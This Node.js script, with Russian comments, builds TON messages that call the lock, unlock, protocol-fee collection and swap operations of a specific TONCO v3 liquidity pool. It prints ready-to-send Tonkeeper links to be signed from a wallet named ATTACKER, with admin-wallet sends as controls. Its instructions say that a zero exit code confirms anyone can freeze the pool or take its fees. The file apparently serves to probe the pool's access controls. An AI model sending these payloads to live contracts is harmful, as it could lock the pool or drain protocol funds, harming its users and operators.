const { beginCell, Address, toNano } = require('@ton/core');

// ========== Опкоды из TONCO SDK ==========
const POOLV3_LOCK = 0x5e74697;
const POOLV3_UNLOCK = 0x3205adbd;
const POOLV3_COLLECT_PROTOCOL = 0xd3f8a538;

// ========== Адреса ==========
const NEW_POOL = 'EQBTVxBp0SNUtghiT6sncaP-FgD2omffgwexK0jK9MZErZQ7';
const ADMIN_WALLET = 'UQCvPAknwpT9a9dSCCtF_RdRh2bssBmuOBNG0hamNL5EuLpT';
const ATTACKER_WALLET = 'UQCRcaW_DHaJaTJ1-bhWnElHap2xeOCYVEDKoRWyXSrUatTC';

console.log('=== ТЕСТИРОВАНИЕ LOCK / UNLOCK / COLLECT_PROTOCOL ===');
console.log('Целевой пул:', NEW_POOL);
console.log('');

// ========== ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ: генерация Tonkeeper ссылки ==========
function generateTonkeeperLink(toAddress, amount, body) {
    const boc = body.toBoc().toString('base64');
    return 'https://app.tonkeeper.com/transfer/' + toAddress + '?amount=' + amount.toString() + '&bin=' + encodeURIComponent(boc);
}

// ========================================================================
// TEST 1: POOLV3_LOCK (0x5e74697) — от кошелька attacker
// ========================================================================
console.log('--- TEST 1: POOLV3_LOCK от ATTACKER ---');
console.log('Описание: пытаемся заблокировать пул с любого кошелька');
const lockBody = beginCell()
    .storeUint(POOLV3_LOCK, 32)   // op
    .storeUint(0, 64)             // query_id
    .endCell();

console.log('Body bits:', lockBody.bits.length, 'refs:', lockBody.refs.length);
console.log('Tonkeeper link (отправить с ATTACKER):');
console.log(generateTonkeeperLink(NEW_POOL, toNano('0.1'), lockBody));
console.log('');

// Проверка структуры
const lockCheck = lockBody.beginParse();
console.log('  op:', '0x' + lockCheck.loadUint(32).toString(16));
console.log('  query_id:', lockCheck.loadUint(64));
console.log('  remaining bits:', lockCheck.remainingBits, 'refs:', lockCheck.remainingRefs);
console.log('');

// ========================================================================
// TEST 2: POOLV3_UNLOCK (0x3205adbd) — от кошелька attacker
// ========================================================================
console.log('--- TEST 2: POOLV3_UNLOCK от ATTACKER ---');
console.log('Описание: пытаемся разблокировать пул с любого кошелька');
const unlockBody = beginCell()
    .storeUint(POOLV3_UNLOCK, 32)  // op
    .storeUint(0, 64)             // query_id
    .endCell();

console.log('Body bits:', unlockBody.bits.length, 'refs:', unlockBody.refs.length);
console.log('Tonkeeper link (отправить с ATTACKER):');
console.log(generateTonkeeperLink(NEW_POOL, toNano('0.1'), unlockBody));
console.log('');

// Проверка структуры
const unlockCheck = unlockBody.beginParse();
console.log('  op:', '0x' + unlockCheck.loadUint(32).toString(16));
console.log('  query_id:', unlockCheck.loadUint(64));
console.log('  remaining bits:', unlockCheck.remainingBits, 'refs:', unlockCheck.remainingRefs);
console.log('');

// ========================================================================
// TEST 3: POOLV3_COLLECT_PROTOCOL (0xd3f8a538) — от кошелька attacker
// ========================================================================
console.log('--- TEST 3: POOLV3_COLLECT_PROTOCOL от ATTACKER ---');
console.log('Описание: пытаемся забрать комиссии протокола с любого кошелька');
const collectBody = beginCell()
    .storeUint(POOLV3_COLLECT_PROTOCOL, 32) // op
    .storeUint(0, 64)                       // query_id
    .endCell();

console.log('Body bits:', collectBody.bits.length, 'refs:', collectBody.refs.length);
console.log('Tonkeeper link (отправить с ATTACKER):');
console.log(generateTonkeeperLink(NEW_POOL, toNano('0.1'), collectBody));
console.log('');

// Проверка структуры
const collectCheck = collectBody.beginParse();
console.log('  op:', '0x' + collectCheck.loadUint(32).toString(16));
console.log('  query_id:', collectCheck.loadUint(64));
console.log('  remaining bits:', collectCheck.remainingBits, 'refs:', collectCheck.remainingRefs);
console.log('');

// ========================================================================
// ДОПОЛНИТЕЛЬНО: SWAP (проверка — может ли кто-то инициировать SWAP)
// ========================================================================
console.log('--- TEST 4 (бонус): POOLV3_SWAP от ATTACKER ---');
const POOLV3_SWAP = 0xa7fb58f8;
console.log('Описание: проверка, может ли кто-то инициировать SWAP');
// Примечание: SWAP — это внутренняя операция, которая обычно вызывается через роутер.
// Но на всякий случай проверяем.
const swapBody = beginCell()
    .storeUint(POOLV3_SWAP, 32)     // op
    .storeUint(0, 64)               // query_id
    .storeUint(1, 1)                // direction
    .storeUint(0, 1)                // has_recipient
    .storeUint(0, 160)              // sqrtPriceLimitX96 (0 = no limit... но обычно не 0)
    .storeUint(0, 1)                // has_hint
    .endCell();

console.log('Body bits:', swapBody.bits.length, 'refs:', swapBody.refs.length);
console.log('Tonkeeper link (отправить с ATTACKER):');
console.log(generateTonkeeperLink(NEW_POOL, toNano('0.2'), swapBody));
console.log('');

// ========================================================================
// TEST 5: POOLV3_LOCK + POOLV3_UNLOCK — от ADMIN (для сравнения)
// ========================================================================
console.log('--- TEST 5: POOLV3_LOCK от ADMIN (контрольный) ---');
console.log('Tonkeeper link (отправить с ADMIN):');
console.log(generateTonkeeperLink(NEW_POOL, toNano('0.1'), lockBody));
console.log('');

console.log('--- TEST 6: POOLV3_UNLOCK от ADMIN (контрольный) ---');
console.log('Tonkeeper link (отправить с ADMIN):');
console.log(generateTonkeeperLink(NEW_POOL, toNano('0.1'), unlockBody));
console.log('');

console.log('--- TEST 7: POOLV3_COLLECT_PROTOCOL от ADMIN (контрольный) ---');
console.log('Tonkeeper link (отправить с ADMIN):');
console.log(generateTonkeeperLink(NEW_POOL, toNano('0.1'), collectBody));
console.log('');

console.log('=== ИНСТРУКЦИИ ===');
console.log('1. Открой каждую ссылку в Tonkeeper (или другом кошельке)');
console.log('2. Сначала отправь с ATTACKER wallet (UQCRcaW...), запиши exit_code');
console.log('3. Потом отправь с ADMIN wallet (UQCvPAkn...) для сравнения');
console.log('4. Сравни результаты на tonviewer.com');
console.log('');
console.log('Ожидаемые результаты:');
console.log('  - Если exit_code == 0 → уязвимость подтверждена (любой может вызвать)');
console.log('  - Если exit_code == 82 (POOLV3_INVALID_CALLER) → есть проверка admin');
console.log('  - Если exit_code == 40/41/42 (KNOWN_WALLET/LOCKED/UNLOCKED) → проверка состояния');
console.log('  - Если exit_code == 65535 (COMMON_WRONG_OP) → неправильный опкод');
